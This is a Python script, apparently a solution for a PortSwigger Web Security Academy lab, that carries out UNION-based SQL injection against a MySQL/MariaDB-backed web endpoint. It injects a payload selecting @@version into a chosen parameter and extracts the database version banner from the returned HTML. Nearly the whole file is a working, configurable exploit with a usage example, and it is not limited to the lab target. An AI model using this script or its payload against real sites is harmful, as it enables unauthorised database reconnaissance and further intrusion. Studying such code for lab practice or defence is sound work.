# src/sqli/lab_mysql_version.py
from __future__ import annotations

import argparse
import sys
import re
from typing import Optional

from bs4 import BeautifulSoup

from src.common.cli_utils import build_cli_client, parse_keyvals
from src.common.http_utils import HttpClient
from src.sqli.sqli_utils import sqli_inject


def parse_args(argv: list[str]) -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="SQLi (MySQL/MariaDB): Extract database version via UNION-based injection of @@version."
    )

    # positional
    _ = p.add_argument("url", help="Base URL, e.g. https://target.web-security-academy.net")

    # injection configuration
    _ = p.add_argument("--endpoint", default="/filter", help="Endpoint path (default: %(default)s)")
    _ = p.add_argument(
        "--param-name", default="category", help="Parameter name (default: %(default)s)"
    )
    _ = p.add_argument(
        "--base-value", default="Accessories", help="Benign base value (default: %(default)s)"
    )
    _ = p.add_argument(
        "--method", choices=["GET", "POST"], default="GET", help="HTTP method (default: %(default)s)"
    )
    _ = p.add_argument(
        "--inject",
        choices=["query", "body"],
        default="query",
        help="Where to inject payload (default: %(default)s)",
    )

    # payload shape
    _ = p.add_argument(
        "--columns",
        type=int,
        default=2,
        help="Total number of columns from detection step (default: %(default)s)",
    )
    _ = p.add_argument(
        "--string-col",
        type=int,
        default=1,
        help="Index (1-based) of the column that renders text (default: %(default)s)",
    )

    # plumbing
    _ = p.add_argument("--proxy", default=None, help="HTTP/HTTPS proxy (e.g. http://127.0.0.1:8080)")
    _ = p.add_argument("--insecure", action="store_true", help="Disable TLS verification (Burp/etc.)")
    _ = p.add_argument(
        "--timeout", type=float, default=10.0, help="HTTP timeout in seconds (default: %(default)s)"
    )

    # optional extras
    _ = p.add_argument("--cookie", action="append", default=[], metavar="NAME=VALUE")
    _ = p.add_argument("--header", action="append", default=[], metavar="Name: Value")
    _ = p.add_argument(
        "--base-param",
        action="append",
        default=[],
        metavar="KEY=VALUE",
        help="Additional baseline params (repeatable). Applies to query/body.",
    )

    return p.parse_args(argv)


# Match common MySQL/MariaDB version strings (e.g., "8.0.36", "10.6.16-MariaDB-1", "5.7.42-log", etc.)
VERSION_RE = re.compile(
    r"(?i)\b(?:mysql|mariadb)?[^0-9]{0,10}(\d+(?:\.\d+){1,3}(?:[-._][A-Za-z0-9]+)*)"
)


def extract_db_version(html: str) -> Optional[str]:
    """Extract a plausible MySQL/MariaDB version banner from the HTML."""
    soup = BeautifulSoup(html, "html.parser")

    # 1) Direct text node match
    node = soup.find(string=VERSION_RE)
    if node:
        m = VERSION_RE.search(str(node))
        if m:
            return m.group(0).strip()

    # 2) Typical table cell
    td = soup.find("td", string=VERSION_RE)
    if td:
        m = VERSION_RE.search(td.get_text(" ", strip=True))
        if m:
            return m.group(0).strip()

    # 3) Fallback: scan all visible text chunks
    for t in soup.stripped_strings:
        m = VERSION_RE.search(t)
        if m:
            return m.group(0).strip()

    return None


def exploit_mysql_version(
    client: HttpClient,
    *,
    endpoint: str,
    param_name: str,
    base_value: str,
    method: str,
    inject: str,
    columns: int,
    string_col: int,
    base_params: dict[str, str],
    cookies: dict[str, str],
    headers: dict[str, str],
) -> Optional[str]:
    """
    Perform UNION-based injection selecting @@version.
    Returns the matched version/banner if found, else None.
    """
    # Construct UNION SELECT with @@version placed into the text-rendering column.
    select_parts = ["NULL"] * columns
    select_parts[string_col - 1] = "@@version"
    union_clause = ", ".join(select_parts)

    # Use MySQL-style comment with robustness spacing.
    payload = f"{base_value}' UNION SELECT {union_clause}-- -"

    res = sqli_inject(
        client,
        payload=payload,
        method=method,
        endpoint=endpoint,
        inject=inject,
        param_name=param_name,
        base_params=base_params,
        extra_headers=headers,
        cookies=cookies,
        # Using a light-weight success marker that is likely to appear with @@version
        # but not guaranteed. Final extraction below is authoritative.
        success_marker=".",  # any dot to hint at version-like output (non-binding)
    )

    if not res.success:
        return None

    return extract_db_version(res.body)


def main(argv: list[str]) -> int:
    args = parse_args(argv)

    client = build_cli_client(
        args.url,
        proxy=args.proxy,
        insecure=args.insecure,
        timeout=args.timeout,
    )

    cookies = parse_keyvals(args.cookie, "=")
    headers = parse_keyvals(args.header, ":")
    base_params = parse_keyvals(args.base_param, "=")

    print("[+] Dumping database version via UNION SELECT of @@version...")

    try:
        version = exploit_mysql_version(
            client,
            endpoint=args.endpoint,
            param_name=args.param_name,
            base_value=args.base_value,
            method=args.method,
            inject=args.inject,
            columns=args.columns,
            string_col=args.string_col,
            base_params=base_params,
            cookies=cookies,
            headers=headers,
        )
    except Exception as exc:
        print(f"[-] Request failed: {exc}")
        return 2

    if version:
        print(f"[+] Database version/banner: {version}")
        return 0
    else:
        print("[-] Unable to extract database version.")
        return 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))

# Usage example
# python -m src.sqli.lab07 \
# https://TARGET.web-security-academy.net \
# --endpoint /filter \
# --param-name category \
# --base-value Accessories \
# --columns 2 \
# --string-col 1 \
# --proxy http://127.0.0.1:8080 \
# --insecure
